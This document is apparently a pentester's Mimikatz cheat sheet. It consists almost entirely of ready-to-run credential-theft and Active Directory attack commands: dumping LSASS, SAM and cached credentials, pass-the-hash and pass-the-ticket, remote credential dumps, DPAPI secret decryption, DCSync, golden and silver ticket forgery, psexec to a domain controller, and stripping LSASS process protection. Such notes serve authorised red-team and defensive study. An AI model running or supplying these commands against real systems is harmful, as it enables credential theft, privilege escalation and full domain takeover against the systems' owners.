# Mimikatz

### General

Some commands need elevated/debug privileges you can enable them with `token::elevate` and `privilege::debug`. 

Useful commands to dump everything we can:

```text
sekurlsa::logonpasswords
lsadump::sam
lsadump::cache
```

#### Creates tickets from hashes instead of passing hashes directly

```bash
Invoke-Mimikatz -Command '" kerberos:ptt <ticket>"'
Invoke-Mimikatz -Command '"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:<command>"'
```

#### Dump remote credentials

```bash
Invoke-Mimikatz -DumpCreds -ComputerName @("<target1>", "<target2>")
```

### DPAPI

#### Manual

Note: Make you are in a session of type 1, if not migrate to a process that has it. Otherwise these steps don't need special privileges.

```text
dir C:\Users\<username>\AppData\Local\Microsoft\Credentials
```

```text
dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\<id>
```

Note guidMasterKey and pdData. Then there should be matching directories in:

```text
dir C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-<...>
```

```text
dpapi::masterkey /in:C:\Users\<username>\AppData\Roaming\Microsoft\Protect\S-1-5-21-<...>\<guidMasterKey> /rpc"
```

This will show a key file at the bottom, the actual MasterKey. Now we can decrypt the blob:

```text
dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\<...>/masterkey:<MasterKey>
```

#### [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)

Run a combination of attacks:

```text
SharpDPAPI triage
```

Decrypt the secret of the user you are logged in as:

```text
SharpDPAPI rdg /unprotect
```

#### Resources

[https://www.exploit-db.com/docs/48589](https://www.exploit-db.com/docs/48589)

### DCSync

```text
log
lsadump::dcsync /domain:<> /all /csv
```

### Golden Ticket

Allows us to sign valid TGTs for the domain \(requires the krbtgt hash\).

```text
kerberos::golden /user:<> /domain:<> /sid:<> /krbtgt:<> /ticket:<outfile>
```

This can be converted to base64 and then used with Rubeus to pass the ticket:

```text
Rubeus ptt /ticket:<>
```

It can also be used in mimikatz:

```bash
kerberos::ptt <filename>
dir \\DC\\C$
psexec \\DC cmd.exe
```

#### Alternatively this can be done in Metasploit's Kiwi:

```bash
golden_ticket_create -d <domain> -k <krbtgt hash> -s <domain-sid> -u <name, does not have to exist (but can)> -t <filename>
kerberos_ticket_use <filename>
```

### Silver Ticket

Silver tickets are rarely used, the only allow access to services on a single box. To create it we need the machine account hash:

```text
kerberos::golden /user:<> /domain:<> /sid:<> /target:<> /service:<> /rc4:<> /ticket:<outfile>
```

### Remove process protection

Running `!+` loads 'mimidrv', which one needs to copy into the same directory as mimikatz.exe in order for this to work. 

```bash
privilege::debug
!+
!processprotect /process:lsass.exe /remove
# payload e.g. misc::skeleton
!-
```

Alternatively we can use [PPLKiller](https://github.com/RedCursorSecurityConsulting/PPLKiller) which uses a signed driver by MSI to disable process protection \(really a matter of detection,  mimidrv works just fine with AV disabled\).

### Misc

* DC Shadow Attack \([Stealthbits](https://attack.stealthbits.com/how-dcshadow-persistence-attack-works)\)

